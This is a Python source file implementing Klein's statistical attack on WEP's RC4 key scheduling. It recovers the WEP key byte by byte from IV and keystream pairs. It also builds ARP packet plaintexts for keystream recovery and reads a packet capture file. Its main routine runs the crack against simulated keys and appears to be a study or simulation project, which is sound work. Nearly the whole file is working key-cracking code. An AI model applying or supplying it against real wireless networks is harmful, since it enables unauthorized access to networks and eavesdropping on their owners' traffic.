import base64
import datetime
import sys
from collections import Counter

from rc4 import rc4
from utils import log
from wep.iv_and_cipher_generator import iv_and_stream_key_generator


def get_most_common_byte(data, n=256):
    # Originally used in computing the first bytes of the main key.
    # Not needed because we already know the iv
    t_set = []
    for pair in data:
        x_i = pair.get('stream_key')[0]
        # TODO: Zahlenraum anpassen
        t_i = (1 - x_i) % n
        t_set.append(t_i)
    return Counter(t_set).most_common(1)[0]


def calculate_first_key_byte(t, n):
    # Average case t = K[0] + K[1] + 1
    for i in range(n):
        k_0 = i
        k_1 = t - k_0 - 1
        yield k_1


def simulate_permutation(part_of_key, n=256):
    """
    Approximate the permutation by simulating the first i steps
    of the key scheduling of RC4
    :param part_of_key: Known part of the main key
    :return: S-box permuted to step i-1
    """
    # Initialize s-box
    s = []
    for i in range(n):
        s.append(i)

    i, j = 0, 0
    # Calculate permutation for first i bytes
    for i in range(len(part_of_key)):
        j = (j + s[i] + part_of_key[i]) % n
        s[i], s[j] = s[j], s[i]
    return s, i, j


def calculate_key_byte(key_stream, s_box, i, j, n):
    """
    Approximate the key byte at position i
    :param key_stream: RC4 key stream
    :param s_box: S-box at step i-1
    :param i: iterator
    :param j: iterator at step i-1
    :return: key byte at position i
    """
    s_invert = []
    for init in range(n):
        s_invert.append(init)

    # Invert s-box
    for r in range(len(s_box)):
        s_invert[s_box[r]] = r

    # Calculate next key byte
    key_byte = (s_invert[(i - key_stream[i - 1]) % n] - (s_box[i] + j) % n) % n
    return key_byte


def crack_wep(iv_stream_pair, key_length_bytes, n, tuple_amount=sys.maxsize, possible_key=bytearray()):
    """
    Method to approximate the main wep key. The cipher stream is the RC4 stream
    cipher generated by running RC with (iv || main_key).
    :param iv_stream_pair: Set of tuples containing iv and cipher stream
    :param key_length_bytes: length of main wep key in byte
    :param n: Base of integer group
    :param tuple_amount: Amount of tuples which should be used from the set above
    :return: The approximated main wep key
    """
    possible_key_set = []
    key_length = key_length_bytes - len(possible_key) % key_length_bytes
    for b in range(key_length):
        candidates = []
        for index, tuple in enumerate(iv_stream_pair):
            if index > tuple_amount:
                break
            compound_key = bytearray()
            compound_key.extend(tuple.get('iv'))
            if possible_key:
                compound_key.extend(possible_key)
            # Internal permutation S_(i-1) and index j at (i-1)th step
            s_box, i, j = simulate_permutation(compound_key)
            # Calculate possible key byte K[i]
            next_key_byte = calculate_key_byte(tuple.get('stream_key'), s_box, i + 1, j, n)
            candidates.append(next_key_byte)

        # Save bytes with probability
        candidates_and_percentages = []
        for candidate_tuple in Counter(candidates).most_common(5):
            p = candidate_tuple[1] / tuple_amount
            candidates_and_percentages.append((candidate_tuple[0], p))
        # Sort tuples in descending order
        sorted_tuples = sorted(candidates_and_percentages, key=lambda x: x[1], reverse=True)
        # Check if byte with probability 5.3125% exists, as described in Klein's paper
        p_klein = float(1.36 / n)
        if any(map(lambda x: x[1] >= p_klein, sorted_tuples)):
            log("Got byte with probability >= 5.3125%")
            possible_key.extend(bytes([sorted_tuples[0][0]]))
            continue

        # No significant byte found, proceeding with most common bytes
        log("Checking bytes that are most common")
        # Check if probability of first bytes are similar
        threshold = float(0.00003)
        for index in range(1, len(sorted_tuples)):
            first_tuple = sorted_tuples[0]
            tuple = sorted_tuples[index]
            p_delta = float(first_tuple[1] - tuple[1])
            if p_delta < threshold:
                log("Found byte ({}) likely to be key byte, but not most popular\n"
                    "Difference in probability from most common byte: {}".format(bytes([tuple[0]]), p_delta))
                subprocess_key = bytearray()
                subprocess_key[:] = possible_key
                subprocess_key.extend(bytes([tuple[0]]))
                key = crack_wep(iv_stream_pair=iv_stream_pair, key_length_bytes=key_length_bytes, n=n,
                                tuple_amount=tuple_amount, possible_key=subprocess_key)
                possible_key_set.extend(key)
        possible_key.extend(bytes([sorted_tuples[0][0]]))
    possible_key_set.append(possible_key)
    return possible_key_set


def crack_simulation(n=256, tuple_amount=90000, rounds=1, key_length=40, iv_length=24):
    start = datetime.datetime.now()
    key_length_bytes = int(key_length / 8) - 1

    # Retrieve sample set of bytearray tuples
    log("Collection Key Stream ... ", level=0)
    iv_stream_pair, main_key = iv_and_stream_key_generator(tuple_amount=tuple_amount, rounds=rounds, n=n,
                                                           key_length=key_length, iv_length=iv_length, cache=True)
    log("Key Stream collected after {}ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)),
        level=0)

    # Crack wep by approximating main key bytes from (iv, stream cipher) pairs
    log("Start Hacking {} ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)), level=0)
    possible_key = crack_wep(iv_stream_pair, key_length_bytes, n, tuple_amount)

    ms_end = int((datetime.datetime.now() - start).total_seconds() * 1000)
    s_end = int((datetime.datetime.now() - start).total_seconds())
    log("Key found after {}ms ({} seconds)".format(ms_end, s_end), level=0)
    return possible_key, main_key


def generate_arp_request_package_plaintext():
    llc_header = base64.b16decode(b'AAAA030000000806')
    arp_header = base64.b16decode(b'0001080006040001')
    source_mac = base64.b16decode(b'AAAAAAAAAAAA')
    source_ip = base64.b16decode(b'BBBBBBBB')
    target_mac = base64.b16decode(b'FFFFFFFFFFFF')
    target_ip = base64.b16decode(b'EEEEEEEE')

    return llc_header + arp_header + source_mac + source_ip + target_mac + target_ip


def load_requests(filename='../output-03.cap', offset=64):
    # 77:65:70:31:36 [HEX] wep 16
    fh = open(filename, 'rb')
    import mmap
    m = mmap.mmap(fh.fileno(), 0, access=mmap.ACCESS_READ)
    return m[:offset]


def generate_arp_response_package_plaintext():
    """
    LLC-header: AA AA 03 00 00 00 08 06
    ARP-HEADER: 00 01 08 00 06 04 00 02
    Quell-MAC-Adresse (6 Byte) enthält in einer ARP-Anforderung die MAC-Adresse des Senders. In einer ARP-Antwort enthält es die MAC-Adresse des antwortenden Hosts oder Next-Hop-Routers.
    Quell-IP-Adresse (4 Bytes bei IPv4) enthält bei einer ARP-Anforderung die IP-Adresse des anfragenden Hosts. In einer ARP-Antwort enthält es die IP-Adresse des antwortenden Hosts oder Next-Hop-Routers.
    Ziel-MAC-Adresse (6 Byte) ist in einer ARP-Anforderung ein Broadcast (FF:FF:FF:FF:FF:FF). In einer ARP-Antwort enthält es die MAC-Adresse des anfragenden Hosts.
    Ziel-IP-Adresse (4 Bytes bei IPv4) ist bei einer ARP-Anforderung die IP-Adresse des gesuchten Hosts. In einer ARP-Antwort enthält es die IP-Adresse des anfragenden Hosts.
    """
    llc_header = base64.b16decode(b'AAAA030000000806')
    arp_header = base64.b16decode(b'0001080006040002')
    source_mac = base64.b16decode(b'AAAAAAAAAAAA')
    source_ip = base64.b16decode(b'BBBBBBBB')
    target_mac = base64.b16decode(b'FFFFFFFFFFFF')
    target_ip = base64.b16decode(b'EEEEEEEE')

    return llc_header + arp_header + source_mac + source_ip + target_mac + target_ip


def bytes_xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


if __name__ == '__main__':
    """
    keys = []
    chiffre = load_requests(offset=40)
    arp_plain = generate_arp_request_package_plaintext()

    possible = bytes_xor(chiffre, arp_plain)
    print(possible)

    a = [77,65,70,31,36]
    """
    keys = []
    for i in reversed(range(0, 90000, 10000)):
        keys.append(dict(tuple_amount=i, key=crack_simulation(tuple_amount=i)))
    print(keys)

    print(crack_simulation(tuple_amount=90000, key_length=104))
